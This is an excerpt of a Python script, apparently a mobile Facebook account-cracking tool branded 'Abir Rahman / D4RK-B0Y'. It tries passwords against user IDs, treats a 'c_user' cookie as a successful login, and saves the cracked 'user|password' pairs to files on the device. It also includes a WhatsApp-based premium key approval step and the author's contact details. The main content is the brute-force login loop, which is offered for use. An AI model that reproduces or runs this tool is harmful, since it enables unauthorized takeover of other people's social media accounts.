...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801863517912?text=' + tks)
    ...
    if key1 in r1:
        ...
        tks = 'Dear%20Sir,%20Please%20Approve%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1
...
........:::..:::::..::........:::.......::::......:::..:::::..:::::
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
    ...
    Facebook : facebook.com/bap.dakbi

    Connect  : +8801863517912
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/Abir-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/Abir-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1m [!] Tool    : Abir Rahman")

			print (" [!] Brand   : D4RK-B0Y")
			...
			if key in [""]:
				...
				os.system("xdg-open https://chat.whatsapp.com/+8801863517912")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[Abir]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Abir-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/Abir_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/Abir_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m      😍Don't Forget ALLAH😍 \033[1;37m")
            ...
            print("\033[1;32m      I Love Our Prophet Muhammad🥰\033[1;37m")
